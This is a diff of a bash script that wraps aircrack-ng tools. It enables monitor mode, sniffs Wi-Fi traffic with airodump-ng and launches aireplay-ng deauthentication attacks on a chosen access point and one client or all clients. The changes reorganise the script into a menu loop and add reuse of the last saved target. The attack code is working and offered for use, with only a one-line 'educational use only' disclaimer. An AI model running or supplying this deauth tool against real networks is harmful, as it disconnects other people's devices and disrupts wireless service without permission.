@@ -1,22 +1,5 @@
 #!/bin/bash
 
-figlet "Aircrack"
-echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissons to test!"
-echo "- Created by Sondre"
-echo ""
-
-deAuth () {
-   echo "-- Starting de-auth attack ($number requests) --"
-   sudo airmon-ng start $interfaceMon $channel > /dev/null
-	if [ -z "$client" ]
-	then
-		sudo aireplay-ng -0 $number -a $ap $interfaceMon
-	else
-		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
-	fi
-}
-
-
 # interfaces
 interface=wlp8s0
 interfaceMon=wlp8s0mon
@@ -27,15 +10,23 @@ green=`tput setaf 2`
 red=`tput setaf 1`
 reset=`tput sgr0`
 
+# Welcome text
+figlet "Aircrack"
+echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissions to test!"
+echo "- Created by Sondre"
+echo ""
+
+# check root permissions
 if [ "$EUID" -ne 0 ]
-  then echo "${red}PLEASE RUN THIS SCRIPT AS ROOT!"
-  exit
+ 	then echo "${red}PLEASE RUN THIS SCRIPT AS ROOT!"
+ 	exit
 else
-  echo "${green}Root OK${reset}" 
+ 	echo "${green}Root OK${reset}" 
 fi
 
+# Check if Wi-Fi card is in monitor mode
 if [ "$mangedMode" == "0" ]
-then
+	then
 	echo ""
 	echo "WARNING: Montior mode is not enabled."
 	read -p 'Do you wish to enable monitor mode (y / n)?: ' option1
@@ -50,26 +41,31 @@ else
 	echo "${green}MONITOR MODE ENABLED: $interfaceMon ${reset}"
 fi
 
-echo ""
-echo "-- SELECT AN OPERATION --"
-echo "[1] Airodump: see traffic"
-echo "[2] De-auth: De-auth devices on network"
-echo "[3] Disable monitor mode for $interfaceMon"
-echo ""
-read -p 'Select operation: ' option2
+# Choose operation
+start () {
+	echo ""
+	echo "-- SELECT AN OPERATION --"
+	echo "[1] Airodump: see traffic"
+	echo "[2] De-auth: De-auth devices on network"
+	echo "[3] Disable monitor mode for $interfaceMon"
+	echo ""
+	read -p 'Select operation: ' option2
 
-if [ "$option2" == "1" ]
-then
-	sudo airodump-ng $interfaceMon
-	echo "Done."
-elif [ "$option2" == "2" ]
-	then
-	echo ""
-	read -p "Load from file (y/n)? " load
-	echo ""
+	if [ "$option2" == "1" ]
+		then
+		sudo airodump-ng $interfaceMon
+		echo "Done."
+	elif [ "$option2" == "2" ]
+		then
+		echo ""
+		if [ -f "file" ]
+			then
+			read -p "Load last target? (y/n) " load
+			echo ""
+		fi
 
 	if [ "$load" == "y" ]
-	then
+		then
 		ap=$(sed -n 1p file)
 		client=$(sed -n 2p file)
 		channel=$(sed -n 3p file)
@@ -84,6 +80,7 @@ elif [ "$option2" == "2" ]
 		echo ""
 		deAuth
 	else
+		echo "-- New target --"
 		read -p "Access point Mac address: " ap
 		read -p "Client Mac address (leave empty for every device): " client
 		read -p "How many de-auth request should be sent? " number
@@ -93,10 +90,29 @@ elif [ "$option2" == "2" ]
 		printf "$ap\n$client\n$channel" > file # save to file
 
 		deAuth
-fi
+	fi
 elif [ "$option2" == "3" ]
 	then
 	echo "Stoppping interface..."
 	sudo airmon-ng stop $interfaceMon > /dev/null
 	echo "Done."
 fi
+}
+
+deAuth () {
+  echo "-- Starting de-auth attack ($number requests) --"
+  sudo airmon-ng start $interfaceMon $channel > /dev/null
+	if [ -z "$client" ]
+	then
+		sudo aireplay-ng -0 $number -a $ap $interfaceMon
+	else
+		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
+	fi
+
+	echo ""
+	read -p "${green}Attack completed. Press any key to continue...${reset}" blah
+
+	start
+}
+
+start
